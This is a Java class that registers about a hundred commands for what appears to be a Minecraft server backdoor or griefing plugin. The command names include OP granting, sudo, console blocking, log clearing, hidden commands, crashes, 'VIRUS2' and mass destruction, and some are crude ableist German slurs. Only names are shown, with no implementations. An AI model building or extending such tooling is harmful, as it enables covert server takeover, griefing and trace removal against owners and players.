package de.garkolym.cp.manager;

import de.garkolym.cp.commands.CommandBase;
import de.garkolym.cp.commands.impl.*;

import java.util.ArrayList;

public class CommandManager {

    public ArrayList<CommandBase> commands = new ArrayList<>();

    public void registerCommands(CommandBase mod) {
        this.commands.add(mod);
    }

    public void init() {
        this.registerCommands(new Command_FREUND());
        this.registerCommands(new Command_OP());
        this.registerCommands(new Command_DEOP());
        this.registerCommands(new Command_GAMEMODE());
        this.registerCommands(new Command_TP());
        this.registerCommands(new Command_KICK());
        this.registerCommands(new Command_BAN());
        this.registerCommands(new Command_UNBAN2());
        this.registerCommands(new Command_BlockConsole());
        this.registerCommands(new Command_BlockCommand());
        this.registerCommands(new Command_BAURECHTE());
        this.registerCommands(new Command_SUDO());
        this.registerCommands(new Command_SSUDO());
        this.registerCommands(new Command_COMMANDSPY());
        this.registerCommands(new Command_CHAT());
        this.registerCommands(new Command_KILL());
        this.registerCommands(new Command_CRASH());
        this.registerCommands(new Command_AUTISMUS());
        this.registerCommands(new Command_Vanish2());
        this.registerCommands(new Command_HEAL());
        this.registerCommands(new Command_BUNGEECORD());
        this.registerCommands(new Command_INF());
        this.registerCommands(new Command_JUMPSCARE());
        this.registerCommands(new Command_SoundSpam2());
        this.registerCommands(new Command_ClearLog());
        this.registerCommands(new Command_RESOURCEPACK());
        this.registerCommands(new Command_CMD());
        this.registerCommands(new Command_KONTROLLIEREN3());
        this.registerCommands(new Command_PLUGIN());
        this.registerCommands(new Command_BROADCAST());
        this.registerCommands(new Command_CLEARCHAT());
        this.registerCommands(new Command_FREEZE());
        this.registerCommands(new Command_TITLE());
        this.registerCommands(new Command_HideCMD2());
        this.registerCommands(new Command_Nuker());
        this.registerCommands(new Command_PissRakete());
        this.registerCommands(new Command_Explode());
        this.registerCommands(new Command_TNTRakete());
        this.registerCommands(new Command_LookNuker2());
        this.registerCommands(new Command_TNTRegen2());
        this.registerCommands(new Command_LogSpammer());
        this.registerCommands(new Command_MobGriefing());
        this.registerCommands(new Command_BrushCube());
        this.registerCommands(new Command_BrushRegen());
        this.registerCommands(new Command_MassRegen());
        this.registerCommands(new Command_Zunami());
        this.registerCommands(new Command_Tornado2());
        this.registerCommands(new Command_UFO());
        this.registerCommands(new Command_witherkopfwerfer());
        this.registerCommands(new Command_Granate());
        this.registerCommands(new Command_Atombombe2());
        this.registerCommands(new Command_TROLLCREEPER());
        this.registerCommands(new Command_TNTRun());
        this.registerCommands(new Command_GriefHacke());
        this.registerCommands(new Command_EntityExplosion());
        this.registerCommands(new Command_MEGAEXPLOSION2());
        this.registerCommands(new Command_DEMOSCREEN());
        this.registerCommands(new Command_ENDSCREEN());
        this.registerCommands(new Command_SPAWNPIMMEL());
        this.registerCommands(new Command_TNTSCHOCK());
        this.registerCommands(new Command_CapsSchreiber());
        this.registerCommands(new Command_FAILCOMMAND());
        this.registerCommands(new Command_HACKED2());
        this.registerCommands(new Command_FLYHACKER());
        this.registerCommands(new Command_ScreenBlock());
        this.registerCommands(new Command_ENGEL());
        this.registerCommands(new Command_TagNachtSpam());
        this.registerCommands(new Command_SpongePlacer());
        this.registerCommands(new Command_BLACKSCREEN());
        this.registerCommands(new Command_KONTRAST());
        this.registerCommands(new Command_WEBTROLL());
        this.registerCommands(new Command_VIRUS2());
        this.registerCommands(new Command_GLASSBOX());
        this.registerCommands(new Command_InstantCrash());
        this.registerCommands(new Command_BeyBlade2());
        this.registerCommands(new Command_toilettentroll3());
        this.registerCommands(new Command_TNTINVASION());
        this.registerCommands(new Command_FAKEMSG());
        this.registerCommands(new Command_FAKEOP());
        this.registerCommands(new Command_REITEN());
        this.registerCommands(new Command_PARTICLEFUCKER());
        this.registerCommands(new Command_LSD());
        this.registerCommands(new Command_TOURETTE2());
        this.registerCommands(new Command_ENDLOSKILL2());
        this.registerCommands(new Command_HIDENENTITYS2());
        this.registerCommands(new Command_DROPALL());
        this.registerCommands(new Command_InvBlock());
        this.registerCommands(new Command_KILLAURA2());
        this.registerCommands(new Command_SPACKMODUS());
        this.registerCommands(new Command_TREE2());
        this.registerCommands(new Command_BodenBug());
        this.registerCommands(new Command_TOPMANN2());
        this.registerCommands(new Command_GRIEFERCHEST());
        this.registerCommands(new Command_KOTZEN());
        this.registerCommands(new Command_SPEEDMOBS());
        this.registerCommands(new Command_NachObenGlotzer2());
        this.registerCommands(new Command_TNTVERFOLGER());
        this.registerCommands(new Command_HARDSTYLER());
        this.registerCommands(new Command_DAMAGE());
        this.registerCommands(new Command_FAKEKILL());

//        this.registerCommands(new Command_TNTPlacer()); //This commands was never registered. We added it to test it. Result of testing: The command is not working
    }

}
